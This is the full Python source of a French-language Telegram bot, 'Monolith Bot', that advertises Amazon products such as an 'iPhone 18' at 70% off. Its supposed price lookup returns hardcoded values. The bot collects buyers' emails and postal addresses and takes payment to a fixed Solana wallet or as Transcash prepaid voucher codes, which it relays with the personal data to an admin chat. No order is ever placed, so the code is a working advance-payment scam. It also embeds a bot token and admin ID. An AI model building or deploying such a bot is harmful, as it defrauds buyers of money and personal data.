import logging
from telegram import ReplyKeyboardMarkup, ReplyKeyboardRemove, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

TOKEN = "9141561726:AAFEK2W08YjXZ_hwNXW55loCqh8dYuKnxXQ"
ADMIN_CHAT_ID = "9008709960"

user_data_store = {}

def ai_find_amazon_item(query: str):
    q = query.lower().strip()
    if "18 pro max" in q:
        return {
            "name": "iPhone 18 Pro Max",
            "base_price": 1479,
            "variants": ["256 Go", "512 Go", "2 To"]
        }
    elif "18 pro" in q or "iphone 18" in q:
        return {
            "name": "iPhone 18 Pro",
            "base_price": 1329,
            "variants": ["256 Go", "1 To", "2 To"]
        }
    else:
        return {
            "name": query.capitalize(),
            "base_price": 600,
            "variants": ["Standard"]
        }

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data_store[user_id] = {}
    
    keyboard = [["🌐 Aller sur le site web"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "« Bienvenue sur Monolith Bot »\n\n"
        "Envoie simplement le **nom de l'article Amazon** que tu souhaites obtenir à -70 % ou utilise le bouton ci-dessous :",
        reply_markup=reply_markup
    )

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if text == "🌐 Aller sur le site web":
        await update.message.reply_text(
            "Voici le lien vers notre site web officiel :\n🔗 https://monolithvip.fr",
            reply_markup=ReplyKeyboardRemove()
        )
        return

    user_state = user_data_store.get(user_id, {}).get("step")
    
    if user_state == "choose_variant":
        item_info = user_data_store[user_id]["item_info"]
        if text in item_info["variants"]:
            user_data_store[user_id]["variant"] = text
            user_data_store[user_id]["step"] = "waiting_email"
            await update.message.reply_text(
                f"Variante sélectionnée : {text}\n\nEntre ton **adresse e-mail** pour recevoir le suivi de commande :",
                reply_markup=ReplyKeyboardRemove()
            )
        else:
            await update.message.reply_text("Veuillez sélectionner une variante valide parmi les boutons proposés sur votre clavier.")
        return

    if user_state == "waiting_email":
        user_data_store[user_id]["email"] = text
        user_data_store[user_id]["step"] = "waiting_address"
        await update.message.reply_text("Parfait. Maintenant, envoie ton **adresse postale complète** pour la livraison :")
        return

    if user_state == "waiting_address":
        user_data_store[user_id]["address"] = text
        user_data_store[user_id]["step"] = "choose_payment"
        
        final_price = user_data_store[user_id]["final_price"]
        keyboard = [
            ["🪙 Cryptomonnaie (SOL, LTC, BTC)"],
            ["💳 Transcash"]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
        
        await update.message.reply_text(
            f"« Récapitulatif de commande »\n"
            f"• Article : {user_data_store[user_id]['item_name']}\n"
            f"• Total à payer : **{final_price} €** (-70 %)\n\n"
            f"Choisis ton moyen de paiement sur ton clavier :",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
        return

    if user_state == "choose_payment":
        if text == "🪙 Cryptomonnaie (SOL, LTC, BTC)":
            u_data = user_data_store[user_id]
            amt = round(u_data["final_price"] / 150, 3)
            u_data["step"] = "waiting_crypto_proof"
            await update.message.reply_text(
                f"🪙 **Paiement Cryptomonnaie (Solana)**\n"
                f"• Montant exact : **{amt} SOL**\n"
                f"• Adresse de dépôt : `2dBwp16us8isLdsUZWCV7ZL4T4PBhk6ot2JtWQe2jkKn`\n\n"
                f"Envoie ensuite une **capture d'écran** de ton paiement directement dans cette conversation.",
                reply_markup=ReplyKeyboardRemove(),
                parse_mode="Markdown"
            )
        elif text == "💳 Transcash":
            user_data_store[user_id]["step"] = "waiting_transcash"
            await update.message.reply_text(
                "💳 **Paiement Transcash**\n\nSaisis ton code à 12 chiffres obtenu chez ton buraliste :",
                reply_markup=ReplyKeyboardRemove()
            )
        else:
            await update.message.reply_text("Veuillez choisir un moyen de paiement valide via les boutons.")
        return

    if user_state == "waiting_transcash":
        code = text.replace(" ", "")
        if len(code) != 12 or not code.isdigit():
            await update.message.reply_text("Le code Transcash doit contenir exactement 12 chiffres. Réessaie :")
            return
        
        data = user_data_store[user_id]
        msg = (
            f"🧾 **Nouvelle commande — TRANSCASH**\n"
            f"• Produit : {data['item_name']}\n"
            f"• Montant : {data['final_price']} €\n"
            f"• Code : `{code}`\n"
            f"• E-mail : {data['email']}\n"
            f"• Adresse : {data['address']}"
        )
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode="Markdown")
        await update.message.reply_text("« Commande enregistrée »\n\nTon code a été transmis à un opérateur pour vérification. Tu recevras un e-mail sous peu.")
        user_data_store[user_id] = {}
        return

    await update.message.reply_text("« Analyse en cours »\nRecherche du prix sur Amazon et calcul de la réduction de 70 %...")
    
    item_info = ai_find_amazon_item(text)
    base_price = item_info["base_price"]
    final_price = round((base_price * 0.3) / 10) * 10

    user_data_store[user_id] = {
        "item_name": item_info["name"],
        "base_price": base_price,
        "final_price": final_price,
        "step": "choose_variant",
        "item_info": item_info
    }

    keyboard = [[var] for var in item_info["variants"]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)

    await update.message.reply_text(
        f"Article trouvé : **{item_info['name']}**\n"
        f"• Prix public : ~~{base_price} €~~\n"
        f"• Prix final (-70 %) : **{final_price} €**\n\n"
        f"Sélectionne une variante sur ton clavier :",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_data_store.get(user_id, {}).get("step") == "waiting_crypto_proof":
        photo_file = await update.message.photo[-1].get_file()
        data = user_data_store[user_id]
        
        caption = (
            f"🪙 **Nouvelle commande — CRYPTO**\n"
            f"• Produit : {data['item_name']} ({data.get('variant', 'Standard')})\n"
            f"• Montant : {data['final_price']} €\n"
            f"• E-mail : {data['email']}\n"
            f"• Adresse : {data['address']}"
        )
        await context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=photo_file.file_id, caption=caption, parse_mode="Markdown")
        await update.message.reply_text("« Preuve reçue »\n\nTa commande est enregistrée. Un opérateur va valider la transaction sous peu.")
        user_data_store[user_id] = {}

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    
    print("Bot démarré...")
    app.run_polling()

if __name__ == "__main__":
    main()